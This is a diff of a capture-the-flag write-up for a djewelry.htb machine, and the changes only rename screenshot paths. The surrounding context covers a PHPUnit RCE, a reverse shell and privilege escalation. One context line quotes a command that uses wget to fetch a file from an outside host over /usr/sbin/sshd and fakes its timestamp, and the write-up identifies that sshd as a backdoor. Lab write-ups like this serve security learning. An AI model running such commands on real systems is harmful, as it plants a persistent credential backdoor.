@@ -19,15 +19,15 @@ PORT   STATE SERVICE
 
 The website is a company page:
 
-<figure><img src="../../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (500) (2).png" alt=""><figcaption></figcaption></figure>
 
 If we try to Visit Store, we get redirected to `store.djewelry.htb`. The store page is identical to the original, but it has more functionalities:
 
-<figure><img src="../../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (621) (1).png" alt=""><figcaption></figcaption></figure>
 
 I tried adding products to the cart and maybe finding an exploit pertaining to that, but it was disabled.
 
-<figure><img src="../../../.gitbook/assets/image (630).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (630) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since there's no functionalities on this site, let's run a `feroxbuster` directory scan.
 
@@ -70,11 +70,11 @@ Searching for exploits for each of them leads me an RCE for PHPUnit:
 
 This works:
 
-<figure><img src="../../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (434) (2).png" alt=""><figcaption></figcaption></figure>
 
 Then, use a `bash` one-liner to get a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (639).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (639) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -229,7 +229,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 
 This was a much larger binary, so let's use `ghidra` to get some pseudocode. When looking through the functions, we can see that the `auth_password` function is a backdoor.
 
-<figure><img src="../../../.gitbook/assets/image (16) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 This might contain the credentials for `root`.&#x20;
 
